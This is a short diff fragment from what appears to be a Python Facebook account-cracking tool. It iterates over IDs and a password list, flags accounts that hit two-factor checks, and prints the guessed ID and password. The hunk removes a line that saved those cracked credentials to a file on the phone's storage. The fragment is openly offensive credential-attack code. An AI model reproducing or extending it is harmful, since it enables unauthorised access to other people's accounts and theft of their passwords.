@@ -667,7 +667,6 @@ def M1(ids,names,passlist):
                                 elif twf in str(po):
                                         if 'y' in pcp:
                                                 print('\r\r \033[1;34m[2F-LAXA] '+ids+' | '+pas)
-						open('/sdcard/NEWTON_2F.txt', 'a').write(ids+'|'+pas+'\n')
                                                 twf.append(ids)
                                                 break
                                 elif 'www.facebook.com' in q['error']['message']:
